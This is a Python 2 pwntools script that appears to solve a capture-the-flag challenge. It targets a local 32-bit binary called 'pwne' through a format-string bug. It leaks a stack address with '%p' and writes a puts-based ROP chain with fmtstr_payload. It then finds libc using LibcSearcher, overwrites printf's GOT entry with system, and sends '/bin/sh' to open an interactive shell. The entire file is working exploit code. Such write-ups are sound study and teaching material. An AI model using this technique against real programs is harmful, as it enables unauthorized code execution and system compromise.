#!/usr/bin/env python2
from pwn import *
from LibcSearcher import *
from struct import pack
import os, base64, math
context(arch = "i386",os = "linux", log_level = "debug")

p = process('./pwne')
elf = ELF('./pwne')

p.recvuntil("WANT PLAY[Y/N]\n")
p.sendline("Y")
p.recvuntil("GET YOUR NAME:\n\n")
p.sendline("%p\n\x00")
p.recvuntil("WELCOME \n")
buf_shift = int(p.recvuntil("\n"), 16)
ret_addr = buf_shift + 0x50
p.sendline("10")

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
printf_got = elf.got['printf']
main_sym = 0x80485CD

p.recvuntil("WANT PLAY[Y/N]\n")
p.sendline("Y")
p.recvuntil("GET YOUR NAME:\n\n")
payload = fmtstr_payload(7, 
    {
        ret_addr: puts_plt
    }
)
p.sendline(payload)
p.recvuntil("WELCOME \n")
p.sendline("10")

p.recvuntil("WANT PLAY[Y/N]\n")
p.sendline("Y")
p.recvuntil("GET YOUR NAME:\n\n")
payload = fmtstr_payload(7, 
    {
        ret_addr + 4: main_sym
    }
)
p.sendline(payload)
p.recvuntil("WELCOME \n")
p.sendline("10")

p.recvuntil("WANT PLAY[Y/N]\n")
p.sendline("Y")
p.recvuntil("GET YOUR NAME:\n\n")
payload = fmtstr_payload(7, 
    {
        ret_addr + 8: puts_got
    }
)
p.sendline(payload)
p.recvuntil("WELCOME \n")
p.sendline("10")

p.recvuntil("WANT PLAY[Y/N]\n")
p.sendline("NY")
puts_libc = u32(p.recv(4))
print(hex(puts_libc))

libc = LibcSearcher('puts', puts_libc)
libc_base = puts_libc - libc.dump('puts')
print("base libc: %s" % hex(libc_base))
system_libc = libc_base + libc.dump('system')
print("system libc: %s" % hex(system_libc))

p.recvuntil("GET YOUR NAME:\n\n")
payload = fmtstr_payload(7, {printf_got: system_libc})
p.sendline(payload)
p.sendline("10")
p.recvuntil("WANT PLAY[Y/N]\n")
p.sendline("Y")
p.sendline("/bin/sh")
p.interactive()